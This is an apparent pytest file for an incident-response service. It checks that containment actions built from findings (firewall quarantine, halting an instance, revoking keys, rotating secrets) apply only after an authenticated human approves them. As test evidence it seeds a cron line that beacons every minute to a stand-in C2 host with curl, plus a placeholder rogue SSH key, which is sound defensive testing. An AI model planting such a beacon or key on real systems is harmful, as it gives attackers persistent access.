"""F9: containment action menu built by code from findings (contracts
ActionKind menu, exact Vultr API call on each); POST
/cases/{id}/actions/{action_id}/approve requires a human session. Done when:
nothing is applied without an Approve call."""
from __future__ import annotations

from contracts.models import ActionKind, ActionStatus, Evidence, Finding, Severity
from contracts.vultr import FakeVultr

from backend.db import ActionRow, ReportRow
from backend.recorder import DbCaseRecorder

ADMIN_IP = "203.0.113.7"


async def _seeded_case(client, state, headers) -> str:
    """A sealed case with one critical finding citing evidence."""
    r = await client.post("/cases", headers=headers, json={
        "instance_id": FakeVultr.SHOP_PROD, "reason": "cpu pegged"})
    assert r.status_code == 201, r.text
    cid = r.json()["id"]
    rec = DbCaseRecorder(state.sf, state.log)
    ev = Evidence(id=f"{cid}-ev-002", case_id=cid, path="/etc/cron.d/beacon",
                  sha256="ab" * 32, excerpt="* * * * * curl http://c2.example.com")
    await rec.add_evidence(ev)
    await rec.add_finding(Finding(
        id=f"{cid}-fd-001", case_id=cid, title="Cron beacon to C2",
        severity=Severity.critical, summary="cron job phones home every minute",
        evidence_ids=[ev.id]))
    return cid


async def _menu(client, state, headers) -> list:
    cid = await _seeded_case(client, state, headers)
    actions = await state.service.build_action_menu(cid)
    return cid, actions


async def test_menu_built_from_findings_with_exact_api_calls(client, state, fake, human):
    cid, actions = await _menu(client, state, human)
    by_kind = {a.kind: a for a in actions}
    assert set(by_kind) >= {ActionKind.quarantine_firewall, ActionKind.stop_instance}

    q = by_kind[ActionKind.quarantine_firewall]
    assert q.target == FakeVultr.SHOP_PROD
    assert q.api_method == "PATCH" and q.api_path == f"/v2/instances/{FakeVultr.SHOP_PROD}"
    group_id = q.api_body["firewall_group_id"]
    # the quarantine group exists and allows exactly one thing: admin SSH
    assert group_id in fake.firewall_groups
    rules = fake.firewall_rules[group_id]
    assert len(rules) == 1 and rules[0].port == "22" and rules[0].subnet == ADMIN_IP

    s = by_kind[ActionKind.stop_instance]
    assert s.api_method == "POST"
    assert s.api_path == f"/v2/instances/{FakeVultr.SHOP_PROD}/halt"

    # every action starts proposed, and each proposal hit the SSE stream
    with state.sf() as sn:
        rows = list(sn.query(ActionRow).all())
    assert rows and all(a.status == ActionStatus.proposed.value for a in rows)
    names = [e.event for e in state.log.entries(cid)]
    assert names.count("action_proposed") == len(actions)
    state.log.sse_replay(cid)  # all broadcast payloads validate


async def test_menu_from_report_adds_ssh_and_secret_actions(client, state, fake, human):
    cid, _ = await _menu(client, state, human)
    with state.sf() as sn:
        sn.add(ReportRow(case_id=cid, summary="s", timeline=[], ranked_actions=[],
                         rogue_ssh_keys=["ssh-ed25519 AAAA... rogue@attacker"],
                         secrets_found=["/var/www/.env"]))
        sn.commit()
    actions = await state.service.build_action_menu(cid)
    by_kind = {a.kind: a for a in actions}
    assert ActionKind.revoke_ssh_key in by_kind
    assert ActionKind.rotate_secrets in by_kind
    rk = by_kind[ActionKind.revoke_ssh_key]
    assert rk.api_method is None  # shown as a command for the human, never an API call
    assert "ssh-ed25519 AAAA... rogue@attacker" in rk.description
    rs = by_kind[ActionKind.rotate_secrets]
    assert rs.api_method is None and "/var/www/.env" in rs.description
    # menu build is idempotent: no duplicate actions for the same case
    assert len(actions) == len(await state.service.build_action_menu(cid))


async def test_nothing_applied_without_an_approve(client, state, fake, human):
    await _menu(client, state, human)
    # production untouched while everything is still `proposed`
    assert fake.instances[FakeVultr.SHOP_PROD].firewall_group_id == "fw-shop-web"
    assert fake.instances[FakeVultr.SHOP_PROD].power_status == "running"
    # ... and the quarantine group itself changed nothing on the instance
    assert not any(c[0] in ("PATCH", "POST") and "/v2/instances/" in c[1]
                   and c[1] != "/v2/instances" for c in fake.calls
                   if c[1].startswith(f"/v2/instances/{FakeVultr.SHOP_PROD}"))


async def test_approve_requires_a_human_session(client, state, human):
    cid, actions = await _menu(client, state, human)
    client.cookies.clear()  # the operator is signed out for this call
    r = await client.post(f"/cases/{cid}/actions/{actions[0].id}/approve",
                          json={"approved_by": "operator"})
    assert r.status_code == 401  # no session -> no approval, nothing applied


async def test_approve_marks_action_approved_by_the_session_operator(client, state, human):
    cid, actions = await _menu(client, state, human)
    target = next(a for a in actions if a.kind == ActionKind.quarantine_firewall)
    r = await client.post(f"/cases/{cid}/actions/{target.id}/approve",
                          headers=human, json={"approved_by": "operator"})
    assert r.status_code == 200, r.text
    body = r.json()
    # F10: approving applies the action immediately (endpoint contract)
    assert body["status"] in (ActionStatus.applied.value, ActionStatus.rejected.value)
    assert body["approved_by"] == "operator"
    # the approval is in the hash-chained log, by a human
    entries = [e for e in state.log.entries(cid) if e.event == "action_approved"]
    assert len(entries) == 1
    assert entries[0].payload["action_id"] == target.id
    # approving twice is a conflict; approving a bogus action 404s
    r2 = await client.post(f"/cases/{cid}/actions/{target.id}/approve",
                           headers=human, json={"approved_by": "operator"})
    assert r2.status_code == 409
    r3 = await client.post(f"/cases/{cid}/actions/{cid}-act-nope/approve",
                           headers=human, json={"approved_by": "operator"})
    assert r3.status_code == 404


async def test_approve_uses_session_operator_not_untrusted_body_attribution(
        client, state, human):
    cid, actions = await _menu(client, state, human)
    r = await client.post(f"/cases/{cid}/actions/{actions[0].id}/approve",
                         headers=human, json={"approved_by": "mallory"})
    assert r.status_code == 200
    with state.sf() as sn:
        row = sn.get(ActionRow, actions[0].id)
    assert row.status == ActionStatus.applied.value
    assert row.approved_by == "operator"
